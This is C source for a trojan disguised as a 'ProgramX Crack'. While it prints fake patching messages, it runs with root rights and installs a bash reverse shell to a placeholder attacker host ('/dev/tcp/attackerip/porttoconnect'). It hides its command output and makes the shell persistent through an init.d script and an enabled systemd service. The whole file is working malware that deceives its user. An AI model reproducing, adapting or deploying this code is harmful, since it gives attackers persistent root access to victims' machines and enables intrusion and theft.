#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFFER_SIZE 4096

void runshell()
{
    
    char create_folders[BUFFER_SIZE];
    char first_command[BUFFER_SIZE];
    char second_command[BUFFER_SIZE];
    char third_command[BUFFER_SIZE];
    char fourth_command[BUFFER_SIZE];
    char give_permissions[BUFFER_SIZE];
    
    const char* start_trojan_script_content =   "#!/bin/bash\n"
                                                "# /etc/init.d/programx.sh\n\n"
                                                "case \"\\$1\" in\n"
                                                "    start)\n"
                                                "        /usr/lib/ProgramX/Bin/programx.sh\n"
                                                "        ;;\n"
                                                "    stop)\n"
                                                "        # no code needed \n"
                                                "        ;;\n"
                                                "    restart)\n"
                                                "        \\$0 stop\n"
                                                "        \\$0 start\n"
                                                "        ;;\n"
                                                "    *)\n"
                                                "        echo \"Usage: \\$0 {start|stop|restart}\"\n"
                                                "        exit 1\n"
                                                "esac\n"
                                                "exit 0\n";

    const char* service_content =               "[Unit]\n"
                                                "Description=My ProgramX Service\n"
                                                "After=network.target\n"
                                                "\n"
                                                "[Service]\n"
                                                "ExecStart=/etc/init.d/programx.sh start\n"
                                                "ExecStop=/etc/init.d/programx.sh stop\n"
                                                "Type=forking\n"
                                                "\n"
                                                "[Install]\n"
                                                "WantedBy=multi-user.target";

    const char* mkdir =                         "cd /usr/lib && mkdir ProgramX && cd ProgramX && mkdir Modules && mkdir Bin && mkdir Misc";

    const char* shell_connection =              "#!/bin/bash\n"
                                                "bash -i >& /dev/tcp/attackerip/porttoconnect 0>&1 2>&1 &";

    sprintf(create_folders, mkdir);
    sprintf(first_command, "sudo sh -c 'cat <<EOF > /usr/lib/ProgramX/Bin/programx.sh\n%s' > /dev/null 2>&1", shell_connection);
    sprintf(give_permissions, "cd /usr/lib/ProgramX/Bin && chmod +rwx programx.sh > /dev/null 2>&1");
    sprintf(second_command, "sudo sh -c 'cat <<EOF > /etc/init.d/programx.sh\n%sEOF' > /dev/null 2>&1", start_trojan_script_content);
    sprintf(third_command, "sudo sh -c 'chmod +x /etc/init.d/programx.sh && chown root:root /etc/init.d/programx.sh && cat <<EOF > /etc/systemd/system/programx.service\n%s' > /dev/null 2>&1 &", service_content);
    sprintf(fourth_command, "sudo sh -c 'systemctl daemon-reload && systemctl enable programx.service && systemctl start programx.service' > /dev/null 2>&1 &");

    system(create_folders);
    sleep(1);
    system(first_command);
    sleep(1);
    system(give_permissions);
    sleep(1);
    system(second_command);
    sleep(1);
    system(third_command);
    sleep(1);
    system(fourth_command);

    return;

};

int main()
{
    char choice[BUFFER_SIZE];
    int euid = geteuid();

    if (euid != 0)
    {
        puts("You need to run the program with root privileges");
    }
    else
    {
    puts("ProgramX Crack by SmarttFoxx\n");
    puts("Press any key to patch\n");
    fgets(choice, sizeof(choice), stdin);

    system("clear");
    puts("Finding programX...");
    sleep(2);
    puts("Patching files...");
    runshell();
    sleep(2);
    puts("\nProgram patched!\n");
    puts("Press any key to close");

    fgets(choice, sizeof(choice), stdin);
    }
    
    return 0;
}
